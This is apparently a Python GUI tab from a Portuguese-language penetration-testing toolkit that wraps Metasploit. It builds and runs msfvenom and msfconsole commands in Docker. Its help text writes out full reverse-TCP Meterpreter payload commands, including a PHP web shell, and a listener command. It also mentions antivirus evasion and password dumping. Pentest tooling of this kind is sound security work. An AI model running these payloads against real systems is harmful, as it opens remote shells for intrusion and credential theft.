import flet as ft
from ui.tool_tab import ToolTab
from config import INPUT_STYLE
from tools.metasploit import Metasploit

class MetasploitTab(ToolTab):
    def __init__(self, app, name):
        super().__init__(
            app,
            name,
            "Exploração / Payloads",
            "https://docs.metasploit.com/",
            ft.Icons.BUG_REPORT,
            ft.Icons.SECURITY,
            description="O Metasploit Framework é o projeto de segurança mais utilizado do mundo para testes de penetração e desenvolvimento de assinaturas IDS. O módulo Msfvenom permite gerar milhares de payloads maliciosos customizados.",
            help_text="""GUIA TÉCNICO METASPLOIT (MSF):

Plataforma de desenvolvimento e execução de exploits contra alvos remotos.

1. EXPLICAÇÃO DOS CAMPOS:
   - AÇÃO: 
     * Msfvenom: Gera o arquivo malicioso (payload) para ser enviado ao alvo.
     * Msfconsole: Abre o terminal do Metasploit para gerenciar conexões.
   - PAYLOAD (-p): O código que será executado no alvo. 'Reverse TCP' significa que o alvo ligará de volta para você.
   - LHOST/LPORT: O endereço IP e a porta da SUA máquina que receberá a invasão.
   - FORMATO (-f): O tipo de arquivo. 'elf' para Linux, 'exe' para Windows, 'raw' para shellcode puro.

2. EXEMPLOS DE COMANDO GERADO:
   - Gerar Payload para Linux: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf -o payload.elf
   - Gerar Payload em PHP para Web: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f raw > shell.php
   - Abrir Ouvinte Msfconsole: msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.0.1; run"

3. DICA: 
   O 'Meterpreter' é um payload avançado que roda inteiramente na memória (RAM), dificultando a detecção por antivírus e permitindo pós-exploração avançada (dump de senhas, pivotagem)."""
        )
        self.metasploit = Metasploit()

        input_style = INPUT_STYLE

        self.action = ft.Dropdown(
            label="Ação",
            value="Gerar Payload (Msfvenom)",
            options=[
                ft.dropdown.Option("Gerar Payload (Msfvenom)"),
                ft.dropdown.Option("Iniciar Listener (Msfconsole)"),
            ],
            **input_style
        )

        self.payload = ft.TextField(
            label="Payload (ex: linux/x64/meterpreter/reverse_tcp)",
            value="linux/x64/meterpreter/reverse_tcp",
            **input_style
        )

        self.lhost = ft.TextField(
            label="LHOST (Seu IP)",
            value="192.168.0.100",
            **input_style
        )

        self.lport = ft.TextField(
            label="LPORT (Sua Porta)",
            value="4444",
            **input_style
        )

        self.file_format = ft.Dropdown(
            label="Formato de Saída (Msfvenom)",
            value="elf",
            options=[
                ft.dropdown.Option("elf"),
                ft.dropdown.Option("exe"),
                ft.dropdown.Option("php"),
                ft.dropdown.Option("py"),
                ft.dropdown.Option("raw"),
            ],
            **input_style
        )

        self.extra_params = ft.TextField(
            label="Parâmetros extras",
            value="",
            **input_style
        )

        self.left_col.controls.extend([
            ft.Container(height=10),
            self.action,
            self.payload,
            self.lhost,
            self.lport,
            self.file_format,
            self.extra_params,
        ])
        self.add_manual_controls()

    def reset_fields(self):
        self.action.value = "Gerar Payload (Msfvenom)"
        self.payload.value = "linux/x64/meterpreter/reverse_tcp"
        self.lhost.value = "192.168.0.100"
        self.lport.value = "4444"
        self.file_format.value = "elf"
        self.extra_params.value = ""
        self.free_cmd_switch.value = False
        self.raw_cmd.value = ""
        self.raw_cmd.disabled = True
        self.left_col.update()
        self.app.page.update()

    async def run(self, e):
        await self.clear_terminal()
        try:
            if self.free_cmd_switch.value:
                import shlex
                # No Metasploit, se for comando manual, usamos bash ou repassamos o comando direto
                cmd_list = shlex.split(self.raw_cmd.value) 
                if not cmd_list: return
            else:
                cmd_list = self.metasploit.build_command(
                    action=self.action.value,
                    payload=self.payload.value,
                    lhost=self.lhost.value,
                    lport=self.lport.value,
                    file_format=self.file_format.value,
                    extra_params=self.extra_params.value
                )
            
            # Para Metasploit, forçamos o entrypoint pois a imagem padrão pode dar conflito
            await self.write_terminal("[INFO] Baixando/Iniciando Metasploit Oficial (pode demorar na primeira vez)...\n")
            
            self.last_command = self.metasploit.pretty_command(cmd_list)
            await self.write_terminal(f"[COMANDO] {self.last_command}\n\n")
            await self.app.run_docker(self.metasploit.docker_service, cmd_list, on_output=self.write_terminal, tab=self)
            
            if self.action.value == "Gerar Payload (Msfvenom)":
                await self.write_terminal(f"\n[INFO] Payload salvo no diretório docker/results/payload.{self.file_format.value}\n")
                
        except Exception as err:
            await self.write_terminal(f"[ERRO] {err}\n")
